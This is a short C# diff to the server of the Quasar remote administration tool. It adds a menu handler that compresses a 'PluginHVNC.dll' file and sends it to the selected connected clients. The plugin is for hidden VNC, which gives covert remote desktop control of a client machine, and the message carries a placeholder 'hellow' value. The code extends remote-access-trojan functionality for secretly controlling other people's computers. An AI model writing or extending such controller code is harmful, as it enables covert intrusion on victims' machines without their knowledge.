@@ -7,6 +7,8 @@ using Quasar.Common.Messages.UserSupport.MessageBox;
 using Quasar.Common.Messages.UserSupport.Website;
 using Quasar.Server.Extensions;
 using Quasar.Server.Forms.DarkMode;
+using Quasar.Server.Helper;
+using Quasar.Server.Helpers;
 using Quasar.Server.Messages;
 using Quasar.Server.Models;
 using Quasar.Server.Networking;
@@ -17,6 +19,7 @@ using System.IO;
 using System.Linq;
 using System.Net.Sockets;
 using System.Security.Cryptography.X509Certificates;
+using System.Text;
 using System.Threading;
 using System.Windows.Forms;
 
@@ -854,5 +857,13 @@ namespace Quasar.Server.Forms
 
         #endregion
 
+        private void hVNCToolStripMenuItem_Click(object sender, EventArgs e)
+        {
+            new PluginInstaller(this.GetSelectedClients()).PluginSent(new DoHvnc
+            {
+                Data = Zip.Compress(File.ReadAllBytes("Plugins\\PluginHVNC.dll")),
+                Msg = Encoding.Default.GetBytes("hellow")
+            });
+        }
     }
 }
